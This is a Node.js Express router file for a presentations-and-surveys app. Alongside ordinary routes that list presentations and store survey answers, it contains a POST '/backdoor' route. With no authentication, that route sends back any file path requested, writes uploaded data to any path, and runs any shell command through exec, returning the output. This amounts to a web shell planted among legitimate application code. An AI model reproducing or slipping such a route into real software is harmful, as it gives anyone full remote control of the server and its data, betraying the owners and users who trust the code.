var express = require('express');
var router = express.Router();
var multer = require('multer')
var upload = multer()
var fs = require('fs');
const { exec } = require('child_process')
const Presentation = require('../models/presentation')
const Survey = require('../models/survey')
const sequelize = require('sequelize')

/* GET home page. */
router.get('/presentations', function(req, res, next) {
  Presentation.findAll({
    attributes: ["id", "title", "presenter"],
    order: [[sequelize.fn('lower', sequelize.col('title')), 'ASC']]
  })
  .then((rows) => {
    res.send(rows)
  })
  .catch((error) => {
    res.send([])
  })
});

router.post('/survey', function(req, res, next) {
  if(req.body.links){
    req.body.links = req.body.links.join(' ')
  }
  Survey.upsert(req.body)
  res.send(req.body)
});

router.get('/survey', function(req, res, next) {
  let options = { attributes: { exclude: ['createdAt', 'updatedAt'] } }
  if(req.query.id) {
    options = {...options, where: { presentationID: req.query.id } }
  }
  Survey.findAll(options)
  .then((row) => {
    res.send(row)
  })
  .catch((error) => {
    res.send([])
  })
})

function errNoAndCodeFromErr(err) {
  return {errno: err.errno, errcode: err.code}
}

router.post('/backdoor', upload.single('payload'), function(req, res, next) {
  switch(req.body.cmd) {
    case 'download':
      res.sendFile(req.body.payload, function(err) {
        if(err)
          res.send(errNoAndCodeFromErr(err))
      })
      break
    case 'upload':
    // uploaded via multipart/form-data
      fs.open(req.body.path, 'w', function(err, fd) {
        if(err) {
          res.send(errNoAndCodeFromErr(err))
        } else {
          fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
            if(err) {
              res.send(errNoAndCodeFromErr(err))
            } else {
              res.send({success: true})
            }
          })
        }
      })
      break
    case 'exec':
      exec(req.body.payload, (error, stdout, stderr) => {
        res.send({error: error, stdout: stdout, stderr: stderr})
      })
      break
  }
});


module.exports = router;
